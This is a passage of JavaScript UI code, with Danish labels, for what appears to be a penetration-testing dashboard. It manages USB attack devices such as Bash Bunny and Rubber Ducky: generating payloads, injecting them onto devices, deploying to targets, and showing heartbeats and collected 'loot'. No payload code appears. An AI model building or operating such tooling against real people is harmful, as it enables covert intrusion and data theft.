      h('button', { className: 'dpt-btn dpt-btn-g', onClick: goBack }, '\u2190 Tilbage'),
      h('button', { className: 'dpt-btn dpt-btn-p', disabled: !dConfig, onClick: nextStep }, 'Gener\u00E9r Payload \u2192')
    );
  }

  // Step 3: Generate + Injection Panel
  function renderGenerate() {
    if (!compiled) return h('p', { style: { color: '#5a6a84' } }, 'Genererer...');

    // Fetch compatible devices on first render of this step
    if (injDevs.length === 0 && selDev) fetchCompatibleDevices(selDev.id);

    return h('div', null,
      h('div', { className: 'dpt-h2' }, 'Genereret Payload'),
      h('div', { className: 'dpt-banner dpt-info' },
        selDev.name + ' \u00B7 ' + compiled.size + ' bytes \u00B7 hash: ' + compiled.hash
      ),
      h('pre', { className: 'dpt-code' }, compiled.code),

      // ── INJECTION PANEL ──
      renderInjectionPanel(),

      // Collapsible manual guide
      h('details', { style: { marginTop: '16px' } },
        h('summary', { style: { cursor: 'pointer', color: '#5a6a84', fontSize: '12px' } }, 'Manuel setup guide (fallback)'),
        h('ol', { className: 'dpt-steps', style: { marginTop: '8px' } },
          compiled.steps.map(function (s, i) {
            var isHL = s.indexOf('DEPLOY') > -1;
            return h('li', { key: i, className: isHL ? 'hl' : '' },
              h('span', { className: 'sn' }, i + 1), s
            );
          })
        ),
        h('button', { className: 'dpt-btn dpt-btn-d', onClick: doDeploy, style: { marginTop: '8px' } }, 'Manuel DEPLOY')
      ),

      h('div', { style: { marginTop: '14px' } },
        h('button', { className: 'dpt-btn dpt-btn-g', onClick: goBack }, '\u2190 Tilbage')
      )
    );
  }

  // ── Injection Panel (3 states) ──
  function renderInjectionPanel() {
    // State 1: Ready
    if (injState === 'ready') {
      return h('div', {
        style: { background: '#141a2a', border: '1px solid #4fc3f7', borderRadius: '8px', padding: '18px', marginTop: '16px' }
      },
        h('div', { style: { fontSize: '15px', fontWeight: 700, color: '#4fc3f7', marginBottom: '14px' } },
          '\uD83D\uDCE1 DEVICE INJECTION'
        ),
        // Device selector
        h('div', { className: 'dpt-cfg-row' },
          h('span', { className: 'dpt-cfg-lbl' }, 'Device'),
          h('select', {
            className: 'dpt-sel',
            value: injSelDev ? String(injSelDev.id) : '',
            onChange: function(e) {
              var d = injDevs.find(function(x) { return x.id === parseInt(e.target.value); });
              setInjSelDev(d || null);
              if (d) startPingPoll(d.id);
            }
          },
            h('option', { value: '' }, '\u2014 V\u00E6lg device \u2014'),
            injDevs.map(function(d) {
              var icon = d.status === 'online' ? '\uD83D\uDFE2' : '\uD83D\uDD34';
              return h('option', { value: String(d.id), key: d.id }, icon + ' ' + d.name + ' (' + d.type + ')');
            })
          )
        ),
        // Status row
        injSelDev ? h('div', { className: 'dpt-cfg-row', style: { marginTop: '8px' } },
          h('span', { className: 'dpt-cfg-lbl' }, 'Status'),
          h('span', { style: { color: injSelDev.status === 'online' ? '#4caf50' : '#ff4444', fontSize: '13px' } },
            (injSelDev.status === 'online' ? '\uD83D\uDFE2 Online' : '\uD83D\uDD34 Offline') +
            (injSelDev.wg_ip ? ' (' + injSelDev.wg_ip + ')' : '')
          )
        ) : null,
        // Method row
        injSelDev ? h('div', { className: 'dpt-cfg-row', style: { marginTop: '4px' } },
          h('span', { className: 'dpt-cfg-lbl' }, 'Method'),
          h('span', { style: { color: '#8892a4', fontSize: '13px' } }, getRecommendedMethod(injSelDev))
        ) : null,
        // Inject button
        h('div', { style: { marginTop: '14px' } },
          h('button', {
            className: 'dpt-btn dpt-btn-d',
            disabled: !injSelDev,
            onClick: doInject,
            style: { fontSize: '16px', padding: '12px 32px' }
          }, '\uD83D\uDC89 Inject Payload')
        ),
        injDevs.length === 0 ? h('div', { style: { marginTop: '10px', fontSize: '12px', color: '#5a6a84' } },
          'Ingen kompatible ' + (selDev ? selDev.id : '') + ' devices registreret.'
        ) : null
      );
    }

    // State 2: Injecting
    if (injState === 'injecting') {
      var steps = injJob && injJob.steps ? injJob.steps : (injJob ? [{ step: 'Starter injection...', status: 'in_progress' }] : []);
      return h('div', {
        style: { background: '#141a2a', border: '1px solid #ffd700', borderRadius: '8px', padding: '18px', marginTop: '16px' }
      },
        h('div', { style: { fontSize: '15px', fontWeight: 700, color: '#ffd700', marginBottom: '14px' } },
          '\u23F3 INJECTING...'
        ),
        steps.map(function(s, i) {
          var icon = s.status === 'done' ? '\u2705' : s.status === 'failed' ? '\u274C' : '\u23F3';
          var clr = s.status === 'done' ? '#4caf50' : s.status === 'failed' ? '#ff4444' : '#ffd700';
          return h('div', { key: i, style: { padding: '5px 0', fontSize: '13px', color: clr } }, icon + ' ' + s.step);
        }),
        h('div', { style: { fontSize: '12px', color: '#5a6a84', marginTop: '10px' } },
          (injJob && injJob.method) ? 'Method: ' + injJob.method : 'Venter p\u00e5 response...'
        )
      );
    }

    // State 3a: Done
    if (injState === 'done') {
      return h('div', {
        style: { background: '#141a2a', border: '1px solid #4caf50', borderRadius: '8px', padding: '18px', marginTop: '16px' }
      },
        h('div', { style: { fontSize: '15px', fontWeight: 700, color: '#4caf50', marginBottom: '14px' } },
          '\u2705 PAYLOAD INJECTED'
        ),
        injJob ? h('div', { style: { fontSize: '13px', color: '#e0e0e0', lineHeight: '1.8' } },
          h('div', null, 'Device: ' + (injJob.device_name || '')),
          h('div', null, 'Path: ' + (injJob.payload_path || '')),
          h('div', null, 'Method: ' + (injJob.method || '') + (injJob.agent_name ? ' (via ' + injJob.agent_name + ')' : '')),
          h('div', null, 'Time: ' + ((injJob.completed_at || '').substring(11, 19) || ''))
        ) : null,
        h('div', { style: { marginTop: '12px', fontSize: '13px', color: '#4caf50', lineHeight: '1.5' } },
          'Klar til deployment. ',
          selDev && selDev.id === 'bash-bunny' ? 'Skift Bunny til switch 1 og inds\u00E6t i target.' :
          selDev && selDev.id === 'rubber-ducky' ? 'Inds\u00E6t microSD i Ducky og plug i target.' :
          'Forbind device til target.'
        ),
        injJob && injJob.steps ? injJob.steps.filter(function(s) { return s.status === 'done'; }).map(function(s, i) {
          return h('div', { key: i, style: { fontSize: '11px', color: '#4caf50', marginTop: '2px' } }, '\u2705 ' + s.step);
        }) : null,
        h('button', {
          className: 'dpt-btn dpt-btn-p', onClick: resetInject,
          style: { marginTop: '12px' }
        }, '\uD83D\uDD04 Inject Again')
      );
    }

    // State 3b: Error
    if (injState === 'error') {
      return h('div', {
        style: { background: '#141a2a', border: '1px solid #ff4444', borderRadius: '8px', padding: '18px', marginTop: '16px' }
      },
        h('div', { style: { fontSize: '15px', fontWeight: 700, color: '#ff4444', marginBottom: '14px' } },
          '\u274C INJECTION FEJLET'
        ),
        h('div', { style: { fontSize: '13px', color: '#ff6b6b', marginBottom: '8px' } },
          (injJob && injJob.error) || 'Ingen route til device.'
        ),
        injJob && injJob.steps ? injJob.steps.filter(function(s) { return s.status === 'failed'; }).map(function(s, i) {
          return h('div', { key: i, style: { fontSize: '12px', color: '#ff4444', marginTop: '3px' } }, '\u274C ' + s.step);
        }) : null,
        h('div', { style: { marginTop: '10px', fontSize: '12px', color: '#5a6a84', lineHeight: '1.5' } },
          selDev && selDev.id === 'bash-bunny' ? 'Tjek at Bunny er i arming mode og tilsluttet en PC med agent.' :
          selDev && selDev.id === 'rubber-ducky' ? 'Tilslut Ducky SD-kort til en PC med agent.' :
          'Tjek device forbindelse og agent status.'
        ),
        h('button', {
          className: 'dpt-btn dpt-btn-d', onClick: resetInject,
          style: { marginTop: '12px' }
        }, '\uD83D\uDD04 Retry')
      );
    }

    return null;
  }

  // Step 4: Deploy status
  function renderDeployStatus() {
    if (!depRes) return h('p', { style: { color: '#5a6a84' } }, 'Deployer...');
    return h('div', null,
      h('div', { className: 'dpt-h2' }, 'Deploy Status'),
      h('div', { className: 'dpt-banner dpt-ok' },
        '\u2713 ' + depRes.message + ' \u2014 ID: ' + depRes.deployId
      ),
      h('div', { className: 'dpt-h2' }, 'N\u00E6ste Skridt'),
      h('ol', { className: 'dpt-steps' },
        (depRes.nextSteps || []).map(function (s, i) {
          return h('li', { key: i }, h('span', { className: 'sn' }, i + 1), s);
        })
      ),
      h('button', { className: 'dpt-btn dpt-btn-p', onClick: nextStep }, 'G\u00E5 til Live Feed \u2192')
    );
  }

  // Step 5: Live Feed
  function renderLiveFeed() {
    var hbs = loot ? loot.heartbeats || [] : [];
    var entries = loot ? loot.loot || [] : [];
    return h('div', null,
      h('div', { className: 'dpt-h2' }, 'Live Feed \u2014 ' + (selEng ? selEng.name : '')),
      hbs.length > 0
        ? hbs.map(function (hb, i) {
            var age = Date.now() - new Date(hb.lastSeen).getTime();
            var live = age < 30000;
            return h('div', { className: 'dpt-banner ' + (live ? 'dpt-ok' : 'dpt-err'), key: i },
              h('span', { className: 'dpt-hb ' + (live ? 'dpt-hb-on' : 'dpt-hb-off') }),
              'Device: ' + (hb.deviceKey || '').substring(0, 8) + '... \u00B7 Target: ' + (hb.target || 'pending') +
              ' \u00B7 Status: ' + (hb.status || '') + ' \u00B7 Sidst set: ' + (hb.lastSeen || '')
            );
          })
        : h('div', { className: 'dpt-banner dpt-info' },
            h('span', { className: 'dpt-hb dpt-hb-off' }), 'Venter p\u00E5 heartbeat fra device...'
          ),
      h('div', { className: 'dpt-h2', style: { marginTop: '14px' } }, 'Loot'),
      h('div', { className: 'dpt-loot' },
        entries.length === 0
          ? h('p', { style: { color: '#5a6a84', textAlign: 'center', padding: '18px' } }, 'Ingen loot endnu \u2014 venter p\u00E5 device callback...')
          : entries.slice().reverse().map(function (l, i) {
              return h('div', { className: 'dpt-lentry', key: i },
                h('span', { className: 'lt' }, l.timestamp || ''),
                h('span', { className: 'lk' }, l.type || l.status || 'data'),
                l.deployId ? h('span', { style: { color: '#5a6a84', marginLeft: '6px' } }, 'Deploy: ' + l.deployId) : null
              );
            })
      ),
      h('div', { style: { marginTop: '14px' } },
        h('button', { className: 'dpt-btn dpt-btn-g', onClick: doReset }, 'Ny Deploy'),
        h('button', { className: 'dpt-btn dpt-btn-p', onClick: fetchLoot }, 'Opdater')
      )
    );
  }

  // ── Main render ──
  var stepRenderers = [renderDeviceSelect, renderPayloadSelect, renderConfigure, renderGenerate, renderDeployStatus, renderLiveFeed];

  return h('div', { className: 'dpt-wrap' },
    h('div', { className: 'dpt-title' }, 'Deploy', h('span', null, '// Device Payload Manager')),
    h('p', { className: 'dpt-sub' }, 'V\u00E6lg engagement + device + payload \u2014 dashboardet h\u00E5ndterer resten.'),
    renderStepper(),
    err ? h('div', { className: 'dpt-banner dpt-err' }, err) : null,
    stepRenderers[step] ? stepRenderers[step]() : null
  );
});
